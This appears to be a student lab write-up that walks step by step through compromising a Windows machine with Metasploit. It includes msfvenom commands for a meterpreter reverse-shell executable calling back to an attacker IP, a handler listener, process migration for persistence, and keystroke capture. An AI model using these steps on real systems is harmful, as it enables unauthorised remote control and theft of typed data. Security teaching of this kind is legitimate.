# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
Find the attackers ip address using ifconfig.
![image](https://github.com/Migaleyy/Compromising-windows-using-Metasploit/assets/118262199/7677bedc-20bb-4951-8252-0d2c118d7ed7)
Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe.
![image](https://github.com/Migaleyy/Compromising-windows-using-Metasploit/assets/118262199/f06df730-9b4d-4ce5-8550-886e4308b31b)
copy the fun.exe into the apache /var/www/html folder
![image](https://github.com/Migaleyy/Compromising-windows-using-Metasploit/assets/118262199/fd7d12eb-85c2-4279-a2b8-5e76e2cf881c)
Start apache server sudo systemctl apache2 start
![image](https://github.com/Migaleyy/Compromising-windows-using-Metasploit/assets/118262199/350bad64-2ed4-46f5-9181-6398baf4796d)
Check the status of apache2
![image](https://github.com/Migaleyy/Compromising-windows-using-Metasploit/assets/118262199/6178d93d-75ab-462d-8609-14166bbd7a4d)
Invoke msfconsole:
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit
![image](https://github.com/Migaleyy/Compromising-windows-using-Metasploit/assets/118262199/40b4935a-d4f6-438d-b50e-9ae2f06f3acb)
On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.
![image](https://github.com/Migaleyy/Compromising-windows-using-Metasploit/assets/118262199/ff7a5838-4725-410b-9a35-b5786e0f90a5)
Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit
![image](https://github.com/Migaleyy/Compromising-windows-using-Metasploit/assets/118262199/2fbb33e0-27f2-4036-8eae-a3a2c9be6605)
To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted. 

![image](https://github.com/Migaleyy/Compromising-windows-using-Metasploit/assets/118262199/72d818dd-231d-4bf5-93d4-1b1cd7be9ade)

Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
![image](https://github.com/Migaleyy/Compromising-windows-using-Metasploit/assets/118262199/0c51235c-70e9-4dcc-9010-a68e0233f354)
keyscan_dump Shows the keystrokes captured so far
![image](https://github.com/Migaleyy/Compromising-windows-using-Metasploit/assets/118262199/f2acd028-a648-40bb-b999-ee9810a0bb44)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
